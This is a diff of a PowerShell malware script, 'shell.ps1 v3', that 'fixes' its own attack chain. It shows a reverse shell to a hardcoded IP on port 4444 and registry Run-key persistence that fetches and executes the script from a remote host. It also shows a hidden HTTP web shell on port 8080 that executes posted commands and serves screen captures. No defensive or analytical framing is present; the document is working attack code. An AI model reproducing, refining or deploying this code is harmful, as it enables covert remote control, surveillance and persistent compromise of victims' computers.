@@ -1,54 +1,15 @@
-# shell.ps1 v3 - Persistent Reverse Shell + Web Backdoor + Screen Capture
+# shell.ps1 v3 - FIXED Reverse Shell + Persistent Web Backdoor + Screen
 $a = "System.Net.Sockets."; $b = "TCPClient"; $c = New-Object ($a + $b)("192.168.1.15", 4444); $s = $c.GetStream(); [byte[]]$b_arr = 0..65535|%{0}; $m = ([text.encoding]::ASCII).GetBytes("CONNECTED`nPS " + (pwd).Path + "> "); $s.Write($m,0,$m.Length);
 
-# Persistence (download & execute on login)
+# Persistence FIRST (before loop)
 $regcmd = 'powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString(`"http://192.168.11.67/shell.ps1`")"';
 New-Item 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Force -ErrorAction SilentlyContinue | Out-Null;
 Set-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'SysUpdate' -Value $regcmd -Force -ErrorAction SilentlyContinue;
 
-# Start PERSISTENT HTTP WEB SHELL (runs in SAME process, port 8080)
-$httpjob = Start-Job -ScriptBlock {
-    $listener = New-Object System.Net.HttpListener
-    $listener.Prefixes.Add('http://*:8080/')
-    $listener.Start()
-    $html = '<h1>Web Shell Active</h1><form method=POST><textarea name=cmd rows=20 cols=100></textarea><br><input type=submit value="Execute"></form><hr>'
-    
-    while ($listener.IsListening) {
-        $context = $listener.GetContext()
-        $request = $context.Request
-        $response = $context.Response
-        
-        if ($request.HttpMethod -eq 'POST' -and $request.Url.AbsolutePath -eq '/') {
-            $cmd = $request.Form['cmd']
-            $output = try { Invoke-Expression $cmd 2>&1 | Out-String } catch { $_.Exception.Message }
-            $html = $html + "<pre>$cmd`n$output</pre><hr>"
-        }
-        elseif ($request.Url.AbsolutePath -eq '/screen') {
-            Add-Type -AssemblyName System.Drawing
-            Add-Type -AssemblyName System.Windows.Forms
-            $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
-            $bitmap = New-Object System.Drawing.Bitmap($bounds.Width, $bounds.Height)
-            $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
-            $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
-            $stream = New-Object IO.MemoryStream
-            $bitmap.Save($stream, [System.Drawing.Imaging.ImageFormat]::Jpeg)
-            $response.ContentType = 'image/jpeg'
-            $response.ContentLength64 = $stream.Length
-            $stream.WriteTo($response.OutputStream)
-            $stream.Close()
-        }
-        else {
-            $response.ContentType = 'text/html'
-            $bytes = [Text.Encoding]::UTF8.GetBytes($html)
-            $response.ContentLength64 = $bytes.Length
-            $response.OutputStream.Write($bytes, 0, $bytes.Length)
-        }
-        $response.Close()
-    }
-    $listener.Stop()
-}
+# Launch HTTP SERVER as SEPARATE PROCESS (doesn't block)
+Start-Process powershell -WindowStyle Hidden -ArgumentList "-nop","-c","`$l=New-Object System.Net.HttpListener;`$l.Prefixes.Add('http://*:8080/');`$l.Start();`$html='<h1>WebShell</h1><form method=POST><textarea name=cmd rows=15 cols=80></textarea><br><input type=submit></form>';while(`$l.IsListening){`$ctx=`$l.GetContext();if(`$ctx.Request.HttpMethod -eq 'POST' -and `$ctx.Request.Url.AbsolutePath -eq '/'){`$cmd=`$ctx.Request.Form[`"cmd`"];`$out=try{iex `$cmd 2>&1|Out-String}catch{`$_.Exception.Message};`$html=`$html+'<pre>`$cmd`n`$out</pre><hr>'}elseif(`$ctx.Request.Url.AbsolutePath -eq '/screen'){Add-Type -A 'System.Drawing,System.Windows.Forms';`$b=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds;`$i=New-Object System.Drawing.Bitmap(`$b.Width,`$b.Height);`$g=[System.Drawing.Graphics]::FromImage(`$i);`$g.CopyFromScreen(`$b.Location,[System.Drawing.Point]::Empty,`$b.Size);`$m=New-Object IO.MemoryStream;`$i.Save(`$m,[Drawing.Imaging.ImageFormat]::Jpeg);`$ctx.Response.ContentType='image/jpeg';`$ctx.Response.ContentLength64=`$m.Length;`$m.WriteTo(`$ctx.Response.OutputStream)}else{`$ctx.Response.ContentType='text/html';`$b=[Text.Encoding]::UTF8.GetBytes(`$html);`$ctx.Response.ContentLength64=`$b.Length;`$ctx.Response.OutputStream.Write(`$b,0,`$b.Length)};`$ctx.Response.Close()}"
 
-# Main reverse shell loop (web server runs in parallel background job)
+# NOW reverse shell connects immediately
 while(($i = $s.Read($b_arr, 0, $b_arr.Length)) -ne 0){
     $d = [text.encoding]::ASCII.GetString($b_arr,0, $i); 
     try { $sb = (Invoke-Expression $d 2>&1 | Out-String) } catch { $sb = $_.Exception.Message }; 
@@ -56,7 +17,4 @@ while(($i = $s.Read($b_arr, 0, $b_arr.Length)) -ne 0){
     $m = ([text.encoding]::ASCII).GetBytes($out); 
     $s.Write($m,0,$m.Length); 
     $s.Flush()
-}
-
-# Cleanup on exit
-$c.Close(); Stop-Job $httpjob; Remove-Job $httpjob
+}; $c.Close()
